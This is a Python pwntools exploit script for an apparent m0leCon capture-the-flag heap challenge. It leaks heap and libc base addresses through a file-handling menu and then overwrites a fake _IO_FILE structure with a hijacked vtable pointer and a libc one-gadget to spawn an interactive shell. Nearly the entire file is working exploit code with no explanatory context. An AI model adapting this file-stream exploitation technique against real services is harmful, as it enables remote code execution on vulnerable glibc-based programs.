from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "challs.m0lecon.it"
    port = 9013
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, '\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(verbose=True):
    s = r.recv()
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip('\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(':')
    sendline(str(choice))

# receive and send
def rs(r, s, new_line=True):
    recvuntil(r)
    if new_line:
        sendline(s)
    else:
        send(s)

def index(n):
    recvuntil('Index: ')
    sendline(str(n))

def open_file(i):
    menu(1)
    index(i)

def read_file(i):
    menu(2)
    index(i)
    return recvline()

def close_file(choice=4):
    menu(choice)


open_file(1)
open_file(1)
open_file(1)
close_file()
close_file()
close_file()

heap_base = u64(read_file(1)[:8]) - 0x2810

for i in range(8):
    open_file(1)

for i in range(8):
    close_file()


#open_file(1)

libc_base = u64(read_file(1)[8:16]) - 0xca0 - 0x3eb000

print('libc_base:', hex(libc_base))

for i in range(9):
    open_file(1)

choice_string = 0x602100
flags = 0x00000000fbad2498

stderr = 0x6020e0

pad = 0x0
target = choice_string + 8 + pad

chunk = [
          p64(0x0),
          p64(0x000055ce789cf603), #_IO_read_ptr
          p64(0x000055ce789cf603), # _IO_read_end
          p64(0), #_IO_read_base
          p64(0), #_IO_write_base
          p64(libc_base + 0x4f2c5), #_IO_write_ptr
          p64(libc_base + 0x4f2c5), #_IO_write_end
          p64(0), #_IO_buf_base
          p64(0x700), #_IO_buf_end
          p64(0)*4, #_IO_save_base ~ #_markers
          p64(libc_base +0x3ec680), #chain
          p64(4), #fileno
          p64(0), # _flags2
          p64(0), #_old_offset
          p64(libc_base + 0x3ed8b0),
          p64(0x173),
          p64(0)
          ]
chunk2 = [
          #p64(0),
          #p64(0),
          #p64(0),
          p64(0)*5,
          p64(libc_base + 0x3e8360 + 0x8), #_IO_str_jumps with little zure
          p64(libc_base + 0x00022e91), #_s._allocate_buffer
        ]


chunk = ''.join(chunk)
chunk2 = ''.join(chunk2)

buf = '4' + '\x00' * 7
buf += 'W' * pad
buf += chunk

print(hex(len(buf)))
assert len(buf) == 0xa8

buf += p64(target)
buf += p64(0)

buf += chunk2
print(len(buf))
wait_for_attach()
close_file(choice=buf)


interactive()
